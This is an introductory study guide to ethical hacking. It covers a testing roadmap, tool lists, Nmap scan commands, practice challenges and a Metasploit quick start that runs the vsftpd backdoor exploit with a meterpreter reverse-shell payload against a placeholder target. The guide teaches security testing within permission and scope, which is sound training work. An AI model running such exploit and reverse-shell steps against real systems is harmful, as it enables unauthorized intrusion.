## 📌 Topic Overview

**Ethical Hacking** (aka Penetration Testing) is the authorized practice of probing systems, networks, and applications for vulnerabilities — before malicious hackers find and exploit them. It’s the proactive arm of cybersecurity aimed at **identifying weaknesses and strengthening defenses**.

> Think of ethical hackers as **white-hat ninjas** hired to break in so the fortress can be better fortified.

It blends technical skills, creativity, and a deep understanding of attacker mindsets and tools.

## 🚀 80/20 Roadmap

| Stage | Concept                        | Why It Matters                                               |
|-------|--------------------------------|--------------------------------------------------------------|
| 1️⃣    | Reconnaissance & Footprinting | Collect info about target: IPs, domains, services             |
| 2️⃣    | Scanning & Enumeration        | Discover open ports, running services, system details         |
| 3️⃣    | Vulnerability Analysis        | Identify known exploits, misconfigurations                    |
| 4️⃣    | Exploitation                 | Gain access via vulnerabilities                               |
| 5️⃣    | Post-Exploitation            | Maintain access, escalate privileges, pivot                    |
| 6️⃣    | Reporting                   | Document findings with risk levels and remediation advice     |
| 7️⃣    | Legal & Ethical Frameworks    | Understand laws, rules of engagement, and responsible disclosure |

## 🛠️ Practical Tasks

- ✅ Use **Nmap** for network scanning and port discovery  
- ✅ Perform **WHOIS** and DNS enumeration for footprinting  
- ✅ Run vulnerability scanners like **OpenVAS** or **Nessus**  
- ✅ Exploit simple vulnerabilities with **Metasploit Framework**  
- ✅ Conduct password cracking with **Hydra** or **John the Ripper**  
- ✅ Analyze web apps for XSS, SQLi, and CSRF with **Burp Suite**  
- ✅ Write clear, actionable penetration test reports  
- ✅ Practice responsible disclosure and get familiar with legal boundaries

## 🧾 Cheat Sheets

### ▶️ Nmap Common Commands

```bash
nmap -sS -p 1-65535 target_ip      # TCP SYN scan all ports
nmap -A target_ip                  # Aggressive scan with OS/service detection
nmap --script vuln target_ip       # Run vulnerability scripts
````

---

### ▶️ Metasploit Quick Start

```bash
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST target_ip
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST your_ip
exploit
```

---

### ▶️ Burp Suite Workflow

1. Set browser proxy to Burp (default 127.0.0.1:8080)
2. Intercept and modify HTTP requests/responses
3. Scan for vulnerabilities with Burp Scanner (Pro)
4. Use Repeater to fuzz inputs and test attack vectors

## 🎯 Progressive Challenges

| Level           | Challenge                                                        |
| --------------- | ---------------------------------------------------------------- |
| 🥉 Beginner     | Scan a local network and identify open ports and services        |
| 🥈 Intermediate | Exploit a vulnerable web app using Burp Suite and manual testing |
| 🥇 Advanced     | Perform privilege escalation on a compromised machine            |
| 🏆 Expert       | Conduct a full red team engagement including phishing simulation |

## 🔍 Mental Model

> “Ethical hacking is a **controlled offense** — combining hacker curiosity with a responsible mindset, systematically probing, exploiting, and reporting weaknesses before attackers do.”

* ✅ Information gathering precedes everything
* ✅ Always test within scope and with permission
* ✅ Automation + manual techniques = thorough testing
* ✅ Good reporting bridges tech and management
* ✅ Ethical hackers are defenders disguised as attackers
